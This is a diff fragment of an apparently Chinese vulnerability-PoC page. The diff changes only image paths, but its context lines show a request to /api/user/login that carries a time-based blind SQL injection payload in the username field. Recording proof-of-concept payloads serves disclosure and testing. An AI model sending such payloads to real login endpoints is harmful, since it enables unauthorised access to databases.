@@ -18,7 +18,7 @@
 
 登录页面
 
-![image-20230828164335170](images/image-20230828164335170.png)
+![image-20230828164335170](../.gitbook/assets/image-20230828164335170.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ POST /api/user/login
 captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(3))a)='
 ```
 
-![image-20230828164347102](images/image-20230828164347102.png)
+![image-20230828164347102](../.gitbook/assets/image-20230828164347102.png)
